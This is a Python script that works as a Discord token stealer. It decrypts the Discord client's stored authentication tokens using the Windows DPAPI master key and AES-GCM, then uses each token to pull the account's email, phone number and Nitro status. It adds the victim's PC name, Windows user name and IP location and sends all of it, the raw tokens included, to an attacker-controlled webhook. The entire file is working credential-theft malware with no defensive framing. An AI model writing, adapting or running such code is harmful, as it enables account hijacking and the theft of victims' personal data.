import os
import json
import base64
import requests
from re import findall
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from urllib.request import Request, urlopen

WEBHOOK_URL = "WEBHOOK_HERE"

APP_DATA = os.getenv("APPDATA")
LOCAL_APP_DATA = os.getenv("LOCALAPPDATA")
DISCORD_PATHS = {
    "Discord": f"{APP_DATA}\\discord",
    "Discord Canary": f"{APP_DATA}\\discordcanary",
    "Discord PTB": f"{APP_DATA}\\discordptb",
}

def get_ip():
    response = requests.get("https://ipinfo.io/json")
    data = response.json()
    ip = data.get("ip") or "Unknown"
    city = data.get("city") or "Unknown"
    region = data.get("region") or "Unknown"
    country = data.get("country") or "Unknown"
    org = data.get("org") or "Unknown"
    return f"> **IP:** `{ip}`\n> **City:** `{city}`\n> **Region:** `{region}`\n> **Country:** `{country}`\n> **Org:** `{org}`"


def get_master_key(path):
    try:
        with open(f"{path}\\Local State", "r", encoding="utf-8") as file:
            local_state = json.load(file)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except:
        return None

def decrypt_token(encrypted_token, master_key):
    try:
        encrypted_token = base64.b64decode(encrypted_token)
        iv, encrypted_data = encrypted_token[3:15], encrypted_token[15:-16]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        return cipher.decrypt(encrypted_data).decode()
    except:
        return None

def get_tokens(path):
    tokens = set()
    master_key = get_master_key(path)
    if not master_key:
        return tokens

    token_path = f"{path}\\Local Storage\\leveldb"
    if not os.path.exists(token_path):
        return tokens

    for file in os.listdir(token_path):
        if not file.endswith(".log") and not file.endswith(".ldb"):
            continue
        try:
            with open(f"{token_path}\\{file}", "r", errors="ignore") as f:
                for line in f.readlines():
                    for match in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                        decrypted = decrypt_token(match.split("dQw4w9WgXcQ:")[1], master_key)
                        if decrypted:
                            tokens.add(decrypted)
        except:
            continue

    return tokens

def get_discord_info(token):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    try:
        res = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
        if res.status_code == 200:
            return res.json()
    except:
        return None

def get_nitro_status(token):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    try:
        res = requests.get("https://discord.com/api/v9/users/@me/billing/subscriptions", headers=headers)
        return bool(res.json()) if res.status_code == 200 else False
    except:
        return False

def send_to_discord(embed):
    try:
        requests.post(WEBHOOK_URL, json={"content": embed})
    except:
        pass

def main():
    all_tokens = set()
    for name, path in DISCORD_PATHS.items():
        if os.path.exists(path):
            all_tokens.update(get_tokens(path))

    if not all_tokens:
        exit()

    ip = get_ip()
    pc_user = os.getenv("UserName")
    pc_name = os.getenv("COMPUTERNAME")

    for token in all_tokens:
        user_info = get_discord_info(token)
        if user_info:
            username = f"{user_info['username']}#{user_info['discriminator']}"
            email = user_info.get("email") or "None"
            phone = user_info.get("phone") or "None"
            nitro = get_nitro_status(token)

            embed = f"""> :incoming_envelope: **Info about `{username}`** *(ID: `{user_info['id']}`)*\n
> :mailbox: **Email:** `{email}`  
> :telephone_receiver: **Phone Number:** `{phone}`  
> :star: **Nitro:** `{nitro}`  

> :computer: **PC Info**  
> **PC Name:** `{pc_name}`  
> **Username:** `{pc_user}`

> :pushpin: **IP Info**\n{ip}   

> :key: **Token**: `{token}`  
"""
            send_to_discord(embed)
    
    exit()

if __name__ == "__main__":
    main()
